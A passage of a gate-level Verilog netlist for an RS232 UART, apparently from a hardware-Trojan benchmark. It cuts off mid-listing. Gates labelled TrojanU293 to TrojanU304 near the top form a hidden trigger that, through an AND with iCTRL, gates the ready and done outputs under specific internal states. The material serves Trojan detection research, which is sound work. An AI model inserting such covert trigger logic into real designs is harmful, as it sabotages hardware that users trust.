module rs232 ( sys_clk, sys_rst_l, uart_XMIT_dataH, xmitH, xmit_dataH_7_, 
        xmit_dataH_6_, xmit_dataH_5_, xmit_dataH_4_, xmit_dataH_3_, 
        xmit_dataH_2_, xmit_dataH_1_, xmit_dataH_0_, xmit_doneH, 
        uart_REC_dataH, rec_dataH_7_, rec_dataH_6_, rec_dataH_5_, rec_dataH_4_, 
        rec_dataH_3_, rec_dataH_2_, rec_dataH_1_, rec_dataH_0_, rec_readyH, 
        test_mode, test_se, test_si, test_so );
  input sys_clk, sys_rst_l, xmitH, xmit_dataH_7_, xmit_dataH_6_, xmit_dataH_5_,
         xmit_dataH_4_, xmit_dataH_3_, xmit_dataH_2_, xmit_dataH_1_,
         xmit_dataH_0_, uart_REC_dataH, test_mode, test_se, test_si;
  output uart_XMIT_dataH, xmit_doneH, rec_dataH_7_, rec_dataH_6_, rec_dataH_5_,
         rec_dataH_4_, rec_dataH_3_, rec_dataH_2_, rec_dataH_1_, rec_dataH_0_,
         rec_readyH, test_so;
  wire   rec_dataH_temp_6, rec_dataH_temp_5, rec_dataH_temp_4,
         rec_dataH_temp_3, rec_dataH_temp_2, rec_dataH_temp_1,
         rec_dataH_temp_0, iCTRL, rec_readyH_temp, xmit_doneH_temp, iXMIT_CRTL,
         iRECEIVER_CTRL, iRECEIVER_state_CTRL, iRECEIVER_state_0_,
         iRECEIVER_state_1_, iRECEIVER_state_2_, iXMIT_N_CTRL_1_,
         iXMIT_N_CTRL_2_, iXMIT_xmit_CTRL, iXMIT_N24, iXMIT_xmit_ShiftRegH_7_,
         iXMIT_xmit_ShiftRegH_6_, iXMIT_xmit_ShiftRegH_5_, iXMIT_N25,
         iXMIT_N46, iXMIT_N45, iXMIT_N44, n241, n245, n238, rec_dataH_rec_7,
         rec_dataH_rec_6, rec_dataH_rec_5, rec_dataH_rec_4, rec_dataH_rec_3,
         rec_dataH_rec_2, rec_dataH_rec_1, rec_dataH_rec_0, n180, n179, n178,
         n177, n176, n175, n174, n173, n172, n171, n170, n169, n168, n167,
         n166, n164, n163, n162, n161, n160, n159, n157, n156, n155, n154,
         n153, test_point_DOUT, n152, n150, n149, n148, n147, n146, n145, n143,
         n142, n141, n140, n139, n138, n136, n135, n134, n133, n132, n131,
         n129, n128, n127, n126, n125, n124, n122, n121, n120, n119, n118,
         n117, n115, n1, n2, n4, n5, n36, n411, n412, n413, n414, n415, n416,
         n417, n418, n419, n420, n421, n422, n423, n424, n425, n426, n427,
         n428, n429, n430, n431, n432, n433, n434, n435, n436, n437, n438,
         n439, n440, n441, n442, n443, n444, n445, n446, n447, n448, n449,
         n450, n451, n452, n453, n454, n455, n456, n457, n458, n459, n460,
         n461, n462, n463, n464, n465, n466, n467, n468, n469, n470, n471,
         n472, n473, n474, n475, n476, n477, n478, n479, n480, n481, n482,
         n483, n484, n485, n486, n487, n488, n489, n490, n491, n492, n493,
         n494, n495, n496, n497, n498, n499, n500, n501, n502, n503, n504,
         n505, n506, n507, n508, n509, n510, n511, n512, n513, n514, n515,
         n516, n517, n518, n519, n520, n521, n522, n523, n524, n525, n526,
         n527, n528, n529, n530, n531, n532, n533, n534, n535, n536, n537,
         n538, n539, n540, n541, n542, n543, n544, n545, n546, n547, n548,
         n549, n550, n551, n552, n553, n554, n555, n556, n557, n558, n559,
         n560, n561, n562, n563, n564, n565, n566, n567, n568, n569, n570,
         n571, n572, n573, n574, n575, n576, n577, n578, n579, n580, n581,
         n582, n583, n584, n585, n586, n587, n588, n589, n590, n591, n592,
         n593, n594, n595, n596, n597, n598, n599, n600, n601, n602, n603,
         n604, n605, n606, n607, n608, n609, n610, n611, n612, n613, n614,
         n615, n616, n617, n618, n619, n620, n621, n622, n623, n624, n625,
         n626, n627, n628, n629, n630, n631, n632, n633, n634, n635, n636,
         n637, n638, n639, n640, n641, n642, n643, n644, n645, n646, n647,
         n648, n649, n650, n651, n652, n653, n654, n655, n656, n657, n658,
         n659, n660, n661, n662, n663, n664, n665, n666, n667, n668, n669,
         n670, n671, n672, n673, n674, n675, n676, n677, n678, n679, n680,
         n681, n682, n683, n684, n685, n686, n687, n688, n689, n690, n691,
         n692, n693, n694, n695, n696, n697, n698, n699, n700, n701, n702,
         n703, n704, n705, n706, n707, n708, n709, n710, n711, n712, n713,
         n714, n715, n716, n717, n718, n719, n720, n721, n722, n723, n724;

  AND2X4 TrojanU304 ( .IN1(iCTRL), .IN2(rec_readyH_temp), .Q(rec_readyH) );
  AND2X4 TrojanU303 ( .IN1(iCTRL), .IN2(xmit_doneH_temp), .Q(xmit_doneH) );
  OR2X1 TrojanU302 ( .IN1(iXMIT_CRTL), .IN2(iRECEIVER_CTRL), .Q(iCTRL) );
  OR2X1 TrojanU301 ( .IN1(iRECEIVER_state_CTRL), .IN2(1'b0), .Q(iRECEIVER_CTRL) );
  NAND4X1 TrojanU297 ( .IN1(n36), .IN2(iRECEIVER_state_0_), .IN3(
        iRECEIVER_state_1_), .IN4(iRECEIVER_state_2_), .QN(
        iRECEIVER_state_CTRL) );
  OR4X4 TrojanU296 ( .IN1(1'b0), .IN2(iXMIT_N_CTRL_1_), .IN3(iXMIT_N_CTRL_2_), 
        .IN4(iXMIT_xmit_CTRL), .Q(iXMIT_CRTL) );
  NAND4X1 TrojanU295 ( .IN1(iXMIT_N24), .IN2(iXMIT_xmit_ShiftRegH_7_), .IN3(
        iXMIT_xmit_ShiftRegH_6_), .IN4(iXMIT_xmit_ShiftRegH_5_), .QN(
        iXMIT_xmit_CTRL) );
  NAND4X1 TrojanU294 ( .IN1(n1), .IN2(n5), .IN3(n4), .IN4(iXMIT_N25), .QN(
        iXMIT_N_CTRL_2_) );
  NAND4X1 TrojanU293 ( .IN1(iXMIT_N46), .IN2(iXMIT_N45), .IN3(iXMIT_N44), 
        .IN4(n2), .QN(iXMIT_N_CTRL_1_) );
  DFFARX1 iXMIT_bitCell_cntrH_reg_2_ ( .D(n180), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n700), .QN(n422) );
  DFFARX1 iXMIT_state_reg_0_ ( .D(n179), .CLK(sys_clk), .RSTB(sys_rst_l), .Q(
        n701), .QN(n419) );
  DFFARX1 iXMIT_state_reg_2_ ( .D(n178), .CLK(sys_clk), .RSTB(sys_rst_l), .Q(
        n702), .QN(n414) );
  DFFARX1 iXMIT_state_reg_1_ ( .D(n177), .CLK(sys_clk), .RSTB(sys_rst_l), .Q(
        n703), .QN(n424) );
  DFFARX1 iXMIT_bitCountH_reg_0_ ( .D(n176), .CLK(sys_clk), .RSTB(sys_rst_l), 
        .Q(n714), .QN(n412) );
  DFFARX1 iXMIT_bitCountH_reg_1_ ( .D(n175), .CLK(sys_clk), .RSTB(sys_rst_l), 
        .Q(n715), .QN(n417) );
  DFFARX1 iXMIT_bitCountH_reg_2_ ( .D(n174), .CLK(sys_clk), .RSTB(sys_rst_l), 
        .Q(n713), .QN(n427) );
  DFFARX1 iXMIT_bitCountH_reg_3_ ( .D(n173), .CLK(sys_clk), .RSTB(sys_rst_l), 
        .Q(n704), .QN(n430) );
  DFFARX1 iXMIT_xmit_ShiftRegH_reg_7_ ( .D(n172), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(iXMIT_xmit_ShiftRegH_7_) );
  DFFARX1 iXMIT_xmit_ShiftRegH_reg_6_ ( .D(n171), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(iXMIT_xmit_ShiftRegH_6_) );
  DFFARX1 iXMIT_xmit_ShiftRegH_reg_5_ ( .D(n170), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(iXMIT_xmit_ShiftRegH_5_) );
  DFFARX1 iXMIT_xmit_ShiftRegH_reg_4_ ( .D(n169), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n705) );
  DFFARX1 iXMIT_xmit_ShiftRegH_reg_3_ ( .D(n168), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n706) );
  DFFARX1 iXMIT_xmit_ShiftRegH_reg_2_ ( .D(n167), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n707) );
  DFFARX1 iXMIT_xmit_ShiftRegH_reg_1_ ( .D(n166), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n708) );
  DFFARX1 iXMIT_xmit_doneH_reg ( .D(n164), .CLK(sys_clk), .RSTB(sys_rst_l), 
        .Q(xmit_doneH_temp) );
  DFFARX1 iRECEIVER_state_reg_1_ ( .D(n163), .CLK(sys_clk), .RSTB(sys_rst_l), 
        .Q(iRECEIVER_state_1_), .QN(n241) );
  DFFASX1 iRECEIVER_state_reg_0_ ( .D(n162), .CLK(sys_clk), .SETB(sys_rst_l), 
        .Q(iRECEIVER_state_0_), .QN(n245) );
  DFFARX1 iRECEIVER_bitCell_cntrH_reg_0_ ( .D(n161), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n724), .QN(n411) );
  DFFARX1 iRECEIVER_bitCell_cntrH_reg_1_ ( .D(n160), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n720), .QN(n420) );
  DFFARX1 iRECEIVER_bitCell_cntrH_reg_2_ ( .D(n159), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n709), .QN(n429) );
  DFFARX1 iRECEIVER_bitCell_cntrH_reg_3_ ( .D(n157), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n721), .QN(n425) );
  DFFARX1 iRECEIVER_state_reg_2_ ( .D(n156), .CLK(sys_clk), .RSTB(sys_rst_l), 
        .Q(iRECEIVER_state_2_), .QN(n238) );
  DFFARX1 iRECEIVER_rec_readyH_reg ( .D(n155), .CLK(sys_clk), .RSTB(sys_rst_l), 
        .Q(rec_readyH_temp) );
  DFFARX1 iRECEIVER_par_dataH_reg_7_ ( .D(n154), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(rec_dataH_rec_7) );
  DFFARX1 rec_dataH_temp_reg_7_ ( .D(n153), .CLK(test_point_DOUT), .RSTB(
        sys_rst_l), .Q(test_so) );
  DFFARX1 rec_dataH_reg_7_ ( .D(n152), .CLK(sys_clk), .RSTB(sys_rst_l), .Q(
        rec_dataH_7_) );
  DFFARX1 iRECEIVER_par_dataH_reg_6_ ( .D(n150), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(rec_dataH_rec_6) );
  DFFARX1 rec_dataH_temp_reg_6_ ( .D(n149), .CLK(test_point_DOUT), .RSTB(
        sys_rst_l), .Q(rec_dataH_temp_6) );
  DFFARX1 rec_dataH_reg_6_ ( .D(n148), .CLK(sys_clk), .RSTB(sys_rst_l), .Q(
        rec_dataH_6_) );
  DFFARX1 iRECEIVER_par_dataH_reg_5_ ( .D(n147), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(rec_dataH_rec_5) );
  DFFARX1 rec_dataH_temp_reg_5_ ( .D(n146), .CLK(test_point_DOUT), .RSTB(
        sys_rst_l), .Q(rec_dataH_temp_5) );
  DFFARX1 rec_dataH_reg_5_ ( .D(n145), .CLK(sys_clk), .RSTB(sys_rst_l), .Q(
        rec_dataH_5_) );
  DFFARX1 iRECEIVER_par_dataH_reg_4_ ( .D(n143), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(rec_dataH_rec_4) );
  DFFARX1 rec_dataH_temp_reg_4_ ( .D(n142), .CLK(test_point_DOUT), .RSTB(
        sys_rst_l), .Q(rec_dataH_temp_4) );
  DFFARX1 rec_dataH_reg_4_ ( .D(n141), .CLK(sys_clk), .RSTB(sys_rst_l), .Q(
        rec_dataH_4_) );
  DFFARX1 iRECEIVER_par_dataH_reg_3_ ( .D(n140), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(rec_dataH_rec_3) );
  DFFARX1 rec_dataH_temp_reg_3_ ( .D(n139), .CLK(test_point_DOUT), .RSTB(
        sys_rst_l), .Q(rec_dataH_temp_3) );
  DFFARX1 rec_dataH_reg_3_ ( .D(n138), .CLK(sys_clk), .RSTB(sys_rst_l), .Q(
        rec_dataH_3_) );
  DFFARX1 iRECEIVER_par_dataH_reg_2_ ( .D(n136), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(rec_dataH_rec_2) );
  DFFARX1 rec_dataH_temp_reg_2_ ( .D(n135), .CLK(test_point_DOUT), .RSTB(
        sys_rst_l), .Q(rec_dataH_temp_2) );
  DFFARX1 rec_dataH_reg_2_ ( .D(n134), .CLK(sys_clk), .RSTB(sys_rst_l), .Q(
        rec_dataH_2_) );
  DFFARX1 iRECEIVER_par_dataH_reg_1_ ( .D(n133), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(rec_dataH_rec_1) );
  DFFARX1 rec_dataH_temp_reg_1_ ( .D(n132), .CLK(test_point_DOUT), .RSTB(
        sys_rst_l), .Q(rec_dataH_temp_1) );
  DFFARX1 rec_dataH_reg_1_ ( .D(n131), .CLK(sys_clk), .RSTB(sys_rst_l), .Q(
        rec_dataH_1_) );
  DFFARX1 iRECEIVER_par_dataH_reg_0_ ( .D(n129), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(rec_dataH_rec_0) );
  DFFARX1 rec_dataH_temp_reg_0_ ( .D(n128), .CLK(test_point_DOUT), .RSTB(
        sys_rst_l), .Q(rec_dataH_temp_0) );
  DFFARX1 rec_dataH_reg_0_ ( .D(n127), .CLK(sys_clk), .RSTB(sys_rst_l), .Q(
        rec_dataH_0_) );
  DFFARX1 iRECEIVER_recd_bitCntrH_reg_3_ ( .D(n126), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n722), .QN(n428) );
  DFFARX1 iRECEIVER_recd_bitCntrH_reg_0_ ( .D(n125), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n717), .QN(n421) );
  DFFARX1 iRECEIVER_recd_bitCntrH_reg_1_ ( .D(n124), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n719), .QN(n413) );
  DFFARX1 iRECEIVER_recd_bitCntrH_reg_2_ ( .D(n122), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n718), .QN(n416) );
  DFFARX1 iXMIT_bitCell_cntrH_reg_3_ ( .D(n121), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n710), .QN(n415) );
  DFFARX1 iXMIT_bitCell_cntrH_reg_0_ ( .D(n120), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n723) );
  DFFARX1 iXMIT_bitCell_cntrH_reg_1_ ( .D(n119), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n711), .QN(n418) );
  DFFARX1 iXMIT_xmit_ShiftRegH_reg_0_ ( .D(n118), .CLK(sys_clk), .RSTB(
        sys_rst_l), .Q(n423) );
  DFFASX1 iRECEIVER_rec_datSyncH_reg ( .D(n117), .CLK(sys_clk), .SETB(
        sys_rst_l), .Q(n712) );
  DFFASX1 iRECEIVER_rec_datH_reg ( .D(n115), .CLK(sys_clk), .SETB(sys_rst_l), 
        .Q(n716), .QN(n426) );
  NAND3X0 U554 ( .IN1(n431), .IN2(n432), .IN3(n433), .QN(uart_XMIT_dataH) );
  NAND2X0 U555 ( .IN1(n434), .IN2(n423), .QN(n433) );
  NAND2X0 U556 ( .IN1(n419), .IN2(n414), .QN(n434) );
  NAND2X0 U557 ( .IN1(n435), .IN2(n436), .QN(test_point_DOUT) );
  NAND2X0 U558 ( .IN1(rec_readyH_temp), .IN2(n437), .QN(n436) );
  INVX0 U559 ( .INP(test_mode), .ZN(n437) );
  NAND2X0 U560 ( .IN1(sys_clk), .IN2(test_mode), .QN(n435) );
  NAND2X0 U561 ( .IN1(n438), .IN2(n439), .QN(n5) );
  NAND2X0 U562 ( .IN1(n4), .IN2(n711), .QN(n439) );
  INVX0 U563 ( .INP(n440), .ZN(n36) );
  NAND2X0 U564 ( .IN1(n441), .IN2(n442), .QN(n180) );
  NAND2X0 U565 ( .IN1(n1), .IN2(n443), .QN(n442) );
  NAND2X0 U566 ( .IN1(test_se), .IN2(n711), .QN(n441) );
  NAND2X0 U567 ( .IN1(n444), .IN2(n445), .QN(n179) );
  NAND2X0 U568 ( .IN1(n704), .IN2(test_se), .QN(n445) );
  NAND2X0 U569 ( .IN1(n446), .IN2(n443), .QN(n444) );
  NAND3X0 U570 ( .IN1(n447), .IN2(n448), .IN3(n449), .QN(n446) );
  NAND2X0 U571 ( .IN1(n702), .IN2(n450), .QN(n449) );
  NAND2X0 U572 ( .IN1(n451), .IN2(n419), .QN(n448) );
  NAND2X0 U573 ( .IN1(n414), .IN2(n452), .QN(n451) );
  NAND2X0 U574 ( .IN1(n453), .IN2(n703), .QN(n452) );
  NAND2X0 U575 ( .IN1(n454), .IN2(n455), .QN(n447) );
  NAND2X0 U576 ( .IN1(n456), .IN2(n457), .QN(n178) );
  NAND3X0 U577 ( .IN1(n450), .IN2(n443), .IN3(n458), .QN(n457) );
  NAND2X0 U578 ( .IN1(n703), .IN2(n459), .QN(n456) );
  NAND2X0 U579 ( .IN1(n443), .IN2(n460), .QN(n459) );
  NAND2X0 U580 ( .IN1(n461), .IN2(n462), .QN(n177) );
  NAND2X0 U581 ( .IN1(test_se), .IN2(n701), .QN(n462) );
  NAND2X0 U582 ( .IN1(n463), .IN2(n443), .QN(n461) );
  NAND2X0 U583 ( .IN1(n464), .IN2(n465), .QN(n463) );
  NAND3X0 U584 ( .IN1(n466), .IN2(n467), .IN3(n468), .QN(n176) );
  NAND2X0 U585 ( .IN1(test_se), .IN2(n710), .QN(n468) );
  NAND2X0 U586 ( .IN1(n469), .IN2(n412), .QN(n467) );
  NAND2X0 U587 ( .IN1(n714), .IN2(n470), .QN(n466) );
  NAND3X0 U588 ( .IN1(n471), .IN2(n472), .IN3(n473), .QN(n175) );
  NAND2X0 U589 ( .IN1(n714), .IN2(test_se), .QN(n473) );
  NAND2X0 U590 ( .IN1(n715), .IN2(n470), .QN(n472) );
  NAND2X0 U591 ( .IN1(n469), .IN2(iXMIT_N44), .QN(n471) );
  NAND3X0 U592 ( .IN1(n474), .IN2(n475), .IN3(n476), .QN(n174) );
  NAND2X0 U593 ( .IN1(n715), .IN2(test_se), .QN(n476) );
  NAND2X0 U594 ( .IN1(n713), .IN2(n470), .QN(n475) );
  NAND2X0 U595 ( .IN1(iXMIT_N45), .IN2(n469), .QN(n474) );
  NAND3X0 U596 ( .IN1(n477), .IN2(n478), .IN3(n479), .QN(n173) );
  NAND2X0 U597 ( .IN1(n713), .IN2(test_se), .QN(n479) );
  NAND2X0 U598 ( .IN1(n470), .IN2(n704), .QN(n478) );
  NOR3X0 U599 ( .IN1(n480), .IN2(test_se), .IN3(n481), .QN(n470) );
  NOR2X0 U600 ( .IN1(n455), .IN2(n482), .QN(n481) );
  NAND2X0 U601 ( .IN1(n469), .IN2(iXMIT_N46), .QN(n477) );
  NOR3X0 U602 ( .IN1(n482), .IN2(test_se), .IN3(n455), .QN(n469) );
  NAND2X0 U603 ( .IN1(n483), .IN2(n484), .QN(n455) );
  NAND4X0 U604 ( .IN1(n704), .IN2(n417), .IN3(n412), .IN4(n427), .QN(n484) );
  INVX0 U605 ( .INP(n454), .ZN(n482) );
  NOR2X0 U606 ( .IN1(n424), .IN2(n419), .QN(n454) );
  NAND2X0 U607 ( .IN1(n485), .IN2(n486), .QN(n172) );
  NAND2X0 U608 ( .IN1(test_se), .IN2(iXMIT_xmit_ShiftRegH_6_), .QN(n486) );
  NAND2X0 U609 ( .IN1(n487), .IN2(n443), .QN(n485) );
  NAND3X0 U610 ( .IN1(n488), .IN2(n489), .IN3(n490), .QN(n487) );
  INVX0 U611 ( .INP(n491), .ZN(n490) );
  NAND2X0 U612 ( .IN1(n464), .IN2(iXMIT_xmit_ShiftRegH_7_), .QN(n489) );
  NAND2X0 U613 ( .IN1(xmit_dataH_7_), .IN2(n492), .QN(n488) );
  INVX0 U614 ( .INP(n464), .ZN(n492) );
  NAND2X0 U615 ( .IN1(n493), .IN2(n494), .QN(n171) );
  NAND2X0 U616 ( .IN1(test_se), .IN2(iXMIT_xmit_ShiftRegH_5_), .QN(n494) );
  NAND2X0 U617 ( .IN1(n495), .IN2(n443), .QN(n493) );
  NAND3X0 U618 ( .IN1(n496), .IN2(n497), .IN3(n498), .QN(n495) );
  NAND2X0 U619 ( .IN1(xmit_dataH_6_), .IN2(n499), .QN(n498) );
  NAND2X0 U620 ( .IN1(n491), .IN2(iXMIT_xmit_ShiftRegH_7_), .QN(n497) );
  NAND2X0 U621 ( .IN1(n464), .IN2(iXMIT_xmit_ShiftRegH_6_), .QN(n496) );
  NAND2X0 U622 ( .IN1(n500), .IN2(n501), .QN(n170) );
  NAND2X0 U623 ( .IN1(n705), .IN2(test_se), .QN(n501) );
  NAND2X0 U624 ( .IN1(n502), .IN2(n443), .QN(n500) );
  NAND3X0 U625 ( .IN1(n503), .IN2(n504), .IN3(n505), .QN(n502) );
  NAND2X0 U626 ( .IN1(xmit_dataH_5_), .IN2(n499), .QN(n505) );
  NAND2X0 U627 ( .IN1(n491), .IN2(iXMIT_xmit_ShiftRegH_6_), .QN(n504) );
  NAND2X0 U628 ( .IN1(n464), .IN2(iXMIT_xmit_ShiftRegH_5_), .QN(n503) );
  NAND2X0 U629 ( .IN1(n506), .IN2(n507), .QN(n169) );
  NAND2X0 U630 ( .IN1(n706), .IN2(test_se), .QN(n507) );
  NAND2X0 U631 ( .IN1(n508), .IN2(n443), .QN(n506) );
  NAND3X0 U632 ( .IN1(n509), .IN2(n510), .IN3(n511), .QN(n508) );
  NAND2X0 U633 ( .IN1(xmit_dataH_4_), .IN2(n499), .QN(n511) );
  NAND2X0 U634 ( .IN1(n491), .IN2(iXMIT_xmit_ShiftRegH_5_), .QN(n510) );
  NAND2X0 U635 ( .IN1(n705), .IN2(n464), .QN(n509) );
  NAND2X0 U636 ( .IN1(n512), .IN2(n513), .QN(n168) );
  NAND2X0 U637 ( .IN1(n707), .IN2(test_se), .QN(n513) );
  NAND2X0 U638 ( .IN1(n514), .IN2(n443), .QN(n512) );
  NAND3X0 U639 ( .IN1(n515), .IN2(n516), .IN3(n517), .QN(n514) );
  NAND2X0 U640 ( .IN1(xmit_dataH_3_), .IN2(n499), .QN(n517) );
  NAND2X0 U641 ( .IN1(n705), .IN2(n491), .QN(n516) );
  NAND2X0 U642 ( .IN1(n706), .IN2(n464), .QN(n515) );
  NAND2X0 U643 ( .IN1(n518), .IN2(n519), .QN(n167) );
  NAND2X0 U644 ( .IN1(n708), .IN2(test_se), .QN(n519) );
  NAND2X0 U645 ( .IN1(n520), .IN2(n443), .QN(n518) );
  NAND3X0 U646 ( .IN1(n521), .IN2(n522), .IN3(n523), .QN(n520) );
  NAND2X0 U647 ( .IN1(xmit_dataH_2_), .IN2(n499), .QN(n523) );
  NAND2X0 U648 ( .IN1(n706), .IN2(n491), .QN(n522) );
  NAND2X0 U649 ( .IN1(n707), .IN2(n464), .QN(n521) );
  NAND2X0 U650 ( .IN1(n524), .IN2(n525), .QN(n166) );
  NAND2X0 U651 ( .IN1(test_se), .IN2(n423), .QN(n525) );
  NAND2X0 U652 ( .IN1(n526), .IN2(n443), .QN(n524) );
  NAND3X0 U653 ( .IN1(n527), .IN2(n528), .IN3(n529), .QN(n526) );
  NAND2X0 U654 ( .IN1(xmit_dataH_1_), .IN2(n499), .QN(n529) );
  NAND2X0 U655 ( .IN1(n707), .IN2(n491), .QN(n528) );
  NAND2X0 U656 ( .IN1(n708), .IN2(n464), .QN(n527) );
  NAND2X0 U657 ( .IN1(n530), .IN2(n531), .QN(n164) );
  NAND2X0 U658 ( .IN1(test_se), .IN2(iXMIT_xmit_ShiftRegH_7_), .QN(n531) );
  NAND2X0 U659 ( .IN1(n532), .IN2(n443), .QN(n530) );
  NAND2X0 U660 ( .IN1(n533), .IN2(n534), .QN(n532) );
  NAND2X0 U661 ( .IN1(n458), .IN2(n453), .QN(n534) );
  INVX0 U662 ( .INP(n432), .ZN(n458) );
  INVX0 U663 ( .INP(n480), .ZN(n533) );
  NOR2X0 U664 ( .IN1(n431), .IN2(xmitH), .QN(n480) );
  NAND3X0 U665 ( .IN1(n535), .IN2(n536), .IN3(n537), .QN(n163) );
  NAND2X0 U666 ( .IN1(n538), .IN2(iRECEIVER_state_0_), .QN(n536) );
  NAND3X0 U667 ( .IN1(n539), .IN2(n540), .IN3(n443), .QN(n538) );
  NAND2X0 U668 ( .IN1(n541), .IN2(iRECEIVER_state_1_), .QN(n540) );
  NAND3X0 U669 ( .IN1(n238), .IN2(n426), .IN3(n241), .QN(n539) );
  NAND3X0 U670 ( .IN1(n542), .IN2(n443), .IN3(n245), .QN(n535) );
  NAND2X0 U671 ( .IN1(n716), .IN2(n543), .QN(n542) );
  NAND2X0 U672 ( .IN1(n544), .IN2(iRECEIVER_state_1_), .QN(n543) );
  NAND2X0 U673 ( .IN1(n545), .IN2(n546), .QN(n162) );
  NAND2X0 U674 ( .IN1(n722), .IN2(test_se), .QN(n546) );
  NAND2X0 U675 ( .IN1(n547), .IN2(n443), .QN(n545) );
  NAND3X0 U676 ( .IN1(n548), .IN2(n549), .IN3(n238), .QN(n547) );
  NAND2X0 U677 ( .IN1(n241), .IN2(n716), .QN(n549) );
  NAND2X0 U678 ( .IN1(n550), .IN2(iRECEIVER_state_1_), .QN(n548) );
  NAND2X0 U679 ( .IN1(n544), .IN2(n551), .QN(n550) );
  NAND2X0 U680 ( .IN1(n552), .IN2(iRECEIVER_state_0_), .QN(n551) );
  NAND2X0 U681 ( .IN1(n553), .IN2(n554), .QN(n552) );
  NAND4X0 U682 ( .IN1(n722), .IN2(n413), .IN3(n416), .IN4(n421), .QN(n554) );
  INVX0 U683 ( .INP(n541), .ZN(n553) );
  NAND2X0 U684 ( .IN1(n555), .IN2(n556), .QN(n161) );
  NAND2X0 U685 ( .IN1(n557), .IN2(n411), .QN(n556) );
  NAND2X0 U686 ( .IN1(test_si), .IN2(test_se), .QN(n555) );
  NAND2X0 U687 ( .IN1(n558), .IN2(n559), .QN(n160) );
  NAND2X0 U688 ( .IN1(n724), .IN2(n560), .QN(n559) );
  NAND2X0 U689 ( .IN1(n443), .IN2(n561), .QN(n560) );
  NAND2X0 U690 ( .IN1(n562), .IN2(n420), .QN(n561) );
  NAND3X0 U691 ( .IN1(n557), .IN2(n720), .IN3(n411), .QN(n558) );
  NAND2X0 U692 ( .IN1(n563), .IN2(n564), .QN(n159) );
  NAND3X0 U693 ( .IN1(n565), .IN2(n566), .IN3(n557), .QN(n564) );
  NAND2X0 U694 ( .IN1(n429), .IN2(n567), .QN(n565) );
  NAND2X0 U695 ( .IN1(n724), .IN2(n720), .QN(n567) );
  NAND2X0 U696 ( .IN1(test_se), .IN2(n720), .QN(n563) );
  NAND2X0 U697 ( .IN1(n568), .IN2(n569), .QN(n157) );
  NAND2X0 U698 ( .IN1(n557), .IN2(n570), .QN(n569) );
  NAND2X0 U699 ( .IN1(n571), .IN2(n572), .QN(n570) );
  NAND2X0 U700 ( .IN1(n721), .IN2(n566), .QN(n572) );
  NAND2X0 U701 ( .IN1(n573), .IN2(n425), .QN(n571) );
  INVX0 U702 ( .INP(n566), .ZN(n573) );
  NAND3X0 U703 ( .IN1(n709), .IN2(n720), .IN3(n724), .QN(n566) );
  INVX0 U704 ( .INP(n574), .ZN(n557) );
  NAND2X0 U705 ( .IN1(n562), .IN2(n443), .QN(n574) );
  NOR4X0 U706 ( .IN1(iRECEIVER_state_2_), .IN2(n575), .IN3(n576), .IN4(n241), 
        .QN(n562) );
  NOR2X0 U707 ( .IN1(n544), .IN2(iRECEIVER_state_0_), .QN(n576) );
  NAND4X0 U708 ( .IN1(n709), .IN2(n411), .IN3(n425), .IN4(n420), .QN(n544) );
  NAND2X0 U709 ( .IN1(test_se), .IN2(n709), .QN(n568) );
  NAND2X0 U710 ( .IN1(n440), .IN2(n577), .QN(n156) );
  NAND2X0 U711 ( .IN1(test_se), .IN2(iRECEIVER_state_1_), .QN(n577) );
  NAND2X0 U712 ( .IN1(n575), .IN2(iRECEIVER_state_1_), .QN(n440) );
  NOR2X0 U713 ( .IN1(n541), .IN2(n245), .QN(n575) );
  NAND4X0 U714 ( .IN1(n709), .IN2(n720), .IN3(n721), .IN4(n411), .QN(n541) );
  NAND2X0 U715 ( .IN1(n578), .IN2(n579), .QN(n155) );
  NAND2X0 U716 ( .IN1(n712), .IN2(test_se), .QN(n579) );
  NAND2X0 U717 ( .IN1(n580), .IN2(n443), .QN(n578) );
  NAND2X0 U718 ( .IN1(n581), .IN2(n582), .QN(n580) );
  NAND2X0 U719 ( .IN1(iRECEIVER_state_2_), .IN2(iRECEIVER_state_0_), .QN(n582)
         );
  NAND3X0 U720 ( .IN1(n583), .IN2(n584), .IN3(n585), .QN(n154) );
  NAND2X0 U721 ( .IN1(rec_dataH_rec_6), .IN2(test_se), .QN(n585) );
  NAND2X0 U722 ( .IN1(rec_dataH_rec_7), .IN2(n586), .QN(n584) );
  NAND2X0 U723 ( .IN1(n587), .IN2(n716), .QN(n583) );
  NAND2X0 U724 ( .IN1(n588), .IN2(n589), .QN(n153) );
  NAND2X0 U725 ( .IN1(rec_dataH_rec_7), .IN2(n443), .QN(n589) );
  NAND2X0 U726 ( .IN1(rec_dataH_temp_6), .IN2(test_se), .QN(n588) );
  NAND2X0 U727 ( .IN1(n590), .IN2(n591), .QN(n152) );
  NAND2X0 U728 ( .IN1(test_so), .IN2(n443), .QN(n591) );
  NAND2X0 U729 ( .IN1(rec_dataH_6_), .IN2(test_se), .QN(n590) );
  NAND3X0 U730 ( .IN1(n592), .IN2(n593), .IN3(n594), .QN(n150) );
  NAND2X0 U731 ( .IN1(rec_dataH_rec_5), .IN2(test_se), .QN(n594) );
